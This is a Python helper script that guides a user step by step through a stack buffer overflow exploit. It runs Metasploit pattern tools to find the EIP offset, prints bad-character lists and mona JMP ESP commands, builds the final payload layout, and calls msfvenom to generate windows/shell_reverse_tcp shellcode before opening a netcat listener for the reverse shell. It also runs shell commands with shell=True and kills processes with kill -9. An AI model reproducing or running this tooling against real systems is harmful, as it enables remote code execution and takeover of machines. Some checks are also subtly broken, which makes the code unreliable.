import argparse
import subprocess
import sys
import textwrap
import socket

from colorama import Fore, Style

'''
    Method: bof
    Purpose: Display steps to conduct buffer overflow in console.
'''


def bof():
    print(textwrap.dedent(
        '''
         Steps to Conduct Buffer Overflow
    
            1.   Fuzzing
            2.   Finding the Offset
            3.   Overwriting the EIP
            4.   Finding Bad Characters
            5.   Finding the Right Module
            6.   Generating Shellcode
            7.   Root! 
        '''
    ))


'''
    Method: finding_the_right_module
    Purpose: Display steps for finding the right module.
'''


def finding_the_right_module():
    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
        f'''
        [5] Find the right module
        
        [5.a]  Look for a DLL that has no memory protections using mona.py
                > Command: !mona modules
                
        [5.b]  Look for something attached to program we are attacking that shows false for the following memory protections:
                > Rebase | SafeSEH | ASLR  | NXCompat | 
                
        [5.c]  Find the instruction "JMP ESP" in module: 
                > Command: !mona find -s "\\xff\\xe4" -m <module .dll>
                
        '''
    ) + Style.RESET_ALL)

    validation()  # Validate user response


'''
    Method: cmd_options
    Purpose: Display commandline options to user.
'''


def cmd_options():
    parser = argparse.ArgumentParser(description="Simple application for step by step buffer overflow",
                                     usage=''' python3 buffer_overflow -s <step number> [options]

        Example: 

            python3 buffer_overflow -s 2 --a''',
                                     formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-s',
                        '--step',
                        type=str,
                        required=True,
                        help='''
     Select which step in the buffer overflow process you'd like to begin

     For example, if you're given the byte count and therefore do not need to fuzz
     begin at step 2:

     Example Usage: python3 buffer_overflow -s 2
     ''')
    parser.add_argument('-a',
                        '--automated',
                        type=str,
                        default=None,
                        required=False,
                        help="The automated option '-a'completes the majority of BOF process for you")
    parser.add_argument('-cp',
                        '--copy_paste',
                        type=str,
                        default=None,
                        required=False,
                        help=
                        '''
    The copy paste option '-cp' will take you through the BOF 
    process step by step; However, commands will need to be copy 
    and pasted in another terminal

    Example Usage: python3 buffer_overflow -s 2 -cp
    ''')

    args = parser.parse_args()

    is_valid_arguments(args.step)

    return args.step, args.automated, args.copy_paste


''' 
    Method: validation
    Purpose: Validate user input
'''


def validation():
    while True:  # While input is not 'y' or 'yes' continue
        response = input(
            Fore.BLUE + Style.BRIGHT + "Have you completed these steps?? Enter 'y' or 'n':" + Style.RESET_ALL)

        if (response.lower() == "y" or response.lower() == "yes") and (response.isalpha()):  # If user input is valid
            break  # Exit loop
        else:  # Input is not correct or step is not finished
            print(Fore.RED + Style.BRIGHT + "[!] Something is wrong. Check your input" + Style.RESET_ALL)
            continue


'''
    Method: is_valid_port
    Purpose: Make sure port is within a valid range.
'''


def is_valid_port(port):
    if port >= 1 and port <= 65535:  # If port is between 1-65535
        return True  # Port is valid
    else:
        return False  # Port is not valid


'''
    Method: is_valid_ip
    Purpose: Check if ip is valid.
'''


def is_valid_ip(ip):
    try:
        if socket.gethostbyname(ip) == ip:  # If ip is a legitimate address
            return True  # Ip is valid
        else:
            return False  # Ip is not valid
    except socket.gaierror:
        print(Fore.RED + Style.BRIGHT + f'[!] Invalid format {ip}' + Style.RESET_ALL)


'''
    Method: is_valid_argument
    Purpose: Check if step input by user is correct
'''


def is_valid_arguments(step):
    if step.isdigit and len(step) == 1:  # If user input is a single digit
        pass  # Input is a valid step
    else:
        print(Fore.RED + Style.BRIGHT + "[!] Input must be a single positive integer" + Style.RESET_ALL)
        sys.exit()  # Exit program


'''
    Method: get_unique_bytes
    Purpose: Receive unique bytes found in EIP register
'''


def get_unique_bytes():
    while True:  # While input is not correct continue
        unique_bytes = input(Fore.BLUE + Style.BRIGHT + "[+] Paste unique bytes found in EIP:" + Style.RESET_ALL)
        if len(str(unique_bytes)) / 2 == 4:  # If
            return str(unique_bytes)
        else:
            print(Fore.RED + Style.BRIGHT + "[!] Input must be an integer" + Style.RESET_ALL)
            continue


def finding_offset():
    print(Fore.CYAN + Style.BRIGHT + "[2] Finding the offset" + Style.RESET_ALL)

    byte_count = get_byte_count()

    generate_unique_bytes(f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {byte_count}")

    unique_bytes = get_unique_bytes()

    offset = find_offset(
        f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {byte_count} -q {unique_bytes} > tmp.txt")

    return offset


'''
    Method: get_byte_count
    Purpose: Receive and sanitize byte count byte
'''


def get_byte_count():
    while True:
        byte_count = input(Fore.BLUE + Style.BRIGHT + "[+] Paste byte count:" + Style.RESET_ALL)
        if byte_count.isdigit() and int(byte_count) >= 0:  # If user input is a digit
            print("\n")
            return str(byte_count)  # Return byte count as string
        else:  # Anything other than an a positive integer is not accepted
            print(Fore.RED + Style.BRIGHT + "[!] Input must be a positive integer" + Style.RESET_ALL)
            continue


'''
    Method: generate_unique_bytes
    Purpose: Generate unique bytes with metasploit pattern create 
'''


def generate_unique_bytes(pattern_create_unique_bytes):
    print("unique_bytes=('")
    subprocess.run(pattern_create_unique_bytes, shell=True)
    print("')", end='')
    print("\n\n")


'''
    Method: find_offset
    Purpose: Extract offset from metasploits pattern offset module
'''


def find_offset(pattern_offset):
    offset = ''
    print("\n")
    subprocess.run(pattern_offset, shell=True)  # Run pattern_offset.rb and output to tmp.txt
    subprocess.run("cat tmp.txt | awk -F ' ' '{ print$6 }' > tmp2.txt", shell=True)  # Extract offset 
    with open('tmp2.txt', 'r') as file:
        for line in file:
            offset = line.rstrip()

    subprocess.run("rm tmp.txt tmp2.txt", shell=True)

    return offset


'''
    Method: bad_characters
    Purpose: Print bad characters to console in a copy and paste format
'''


def bad_characters(offset):
    counter = 0
    print("\n[+] Bad Characters 1-255\n")
    print("badchars=(")
    for chars in range(1, 256):  # Write each HEX character 1-256 skipping NULL byte
        if counter == 0:
            print('"', end="")
        elif counter % 16 == 0:  # Every 16 characters add quotation mark to front of line
            print('"', end="")
        sys.stdout.write("\\x" + '{:02x}'.format(chars))  # Append \x to every HEX character
        if chars % 16 == 0:  # Every 16 characters add quotation mark to end of line
            print('"')
        counter = counter + 1

    print('"', end="" + ")" + "\n\n")

    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
        f'''
           [4] Find bad characters
               
               [4.a] Send all possible 255 characters in hex and look for abnormal characters
                      
        '''
    ) + Style.RESET_ALL)

    print(Fore.RED + Style.BRIGHT + f"payload = 'A' * {offset} + 'B' * 4 + badchars" + Style.RESET_ALL + "\n")

    validation()


'''
    Method: reverse_address
    Purpose: Convert return address to little endian format.
'''


def reverse_address(address):
    address = bytearray.fromhex(address)  # Convert string to byte array
    address.reverse()  # Reverse bytes
    address = ''.join(format(byte, '02x') for byte in address)  # Convert byte array to HEX string
    # Add \x at beginning of every characters i.e. \x65\xaf
    reversed_address = '\\x'.join([address[sub_string:sub_string + 2] for sub_string in range(0, len(address), 2)])
    reversed_address = "\\x" + reversed_address.lower()  # Make all characters lower case and append \x to front
    return reversed_address


'''
    Method: get_address
    Purpose: Receive and sanitize return address
'''


def get_address():
    while True:
        address = input(Fore.BLUE + Style.BRIGHT + "[*] Enter address Example: 625011AF:" + Style.RESET_ALL)
        if address.isalnum() and len(address) / 2 == 4:
            return address
        else:
            print(Fore.RED + Style.BRIGHT + "[!] Somethings wrong.  Check your input" + Style.RESET_ALL)


def overwrite_the_eip(offset):
    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
        f'''
        [3] Overwrite the EIP
            
            [3.a] Once we have the offset send ‘A’s the same size as offset, then four ‘B’s to make sure
                  we have control of EIP example: 
                   
                    > buff = 'A' * {offset} + 'B' * 4
           
           [3.b] The EIP should be overwritten with ‘42424242’ (if not redo step 2)
        '''
    ) + Style.RESET_ALL)

    while True:
        response = input(
            Fore.BLUE + Style.BRIGHT + "Is the 'EIP' overwritten with ‘42424242’? Enter 'y' or 'n':" + Style.RESET_ALL)

        if (response.lower() == "y" or response.lower() == "yes") and (response.isalpha()):
            break
        elif (response.lower() == "n" or response.lower() == "no") and (response.isalpha()):
            print(Fore.GREEN + Style.BRIGHT + "Redoing doing offset module" + Style.RESET_ALL)
            finding_offset()
            continue
        else:
            print(Fore.RED + Style.BRIGHT + "[!] Something is wrong. Check your input" + Style.RESET_ALL)
            continue


def generate_payload(local_host_ip, local_host_port, bad_chars):
    msfvenom = "msfvenom"
    switch_payload = "-p"
    payload = "windows/shell_reverse_tcp"
    lhost = f"LHOST={local_host_ip}"
    lport_msf = f"LPORT={local_host_port}"
    no_crash = "EXITFUNC=thread"
    switch_format = "-f"
    format = "c"
    switch_architecture = "-a"
    architecture = "x86"
    switch_badchars = "-b"

    subprocess.call(
        [msfvenom, switch_payload, payload, lhost, lport_msf, no_crash, switch_format, format, switch_architecture,
         architecture, switch_badchars, bad_chars])

    kill_port(local_host_port)  # Kill all processes listening on local port of choice
    nc_listener(local_host_port)  # Start netcat listener


def get_payload_dependencies():
    print(Fore.CYAN + Style.BRIGHT + "\n[6] Generate shell code" + Style.RESET_ALL)

    while True:
        local_host_ip = input(Fore.BLUE + Style.BRIGHT + "[*] Enter LHOST (ip of your machine):" + Style.RESET_ALL)
        if not is_valid_ip(local_host_ip):
            continue
        else:
            break

    while True:
        local_host_port = input(
            Fore.BLUE + Style.BRIGHT + "[*] Enter LPORT (port you want reverse to call back to):" + Style.RESET_ALL)
        if not local_host_port.isdigit():
            print("\n" + Fore.RED + Style.BRIGHT + "[!] Enter valid port" + Style.RESET_ALL)
            continue
        if not is_valid_port(int(local_host_port)):
            print("\n" + Fore.RED + Style.BRIGHT + "[!] Enter valid port" + Style.RESET_ALL)
            continue
        else:
            break

    bad_chars = input(Fore.BLUE + Style.BRIGHT + "[*] Enter badcharacters found in step 4:" + Style.RESET_ALL)

    return local_host_ip, local_host_port, bad_chars


def kill_port(lport):
    subprocess.run("touch pid.txt", shell=True)
    subprocess.run(f"lsof -i :{lport}" + " | awk 'NR=2 { print$2 }' | grep -v 'PID' > pid.txt", shell=True)
    subprocess.run("while read line; do kill -9 $line; done < pid.txt | rm pid.txt", shell=True)


def nc_listener(lport):
    print(f"\nNecat listener listening on local port {lport}")
    subprocess.run(f"nc -nlvp {lport}", shell=True)


def display_final_payload(offset, address):
    address = reverse_address(address)
    print(
        Fore.RED + Style.BRIGHT + f"\npayload = ‘A' * {offset} + ‘{address}’ + \\x90 * 32 + shellcode\n" + Style.RESET_ALL)


def main():
    cmd_options()

    bof()

    offset = finding_offset()

    overwrite_the_eip(offset)

    bad_characters(offset)

    finding_the_right_module()

    address = get_address()

    local_host_ip, local_host_port, bad_chars = get_payload_dependencies()

    display_final_payload(offset, address)

    generate_payload(local_host_ip, local_host_port, bad_chars)


if __name__ == '__main__':
    main()
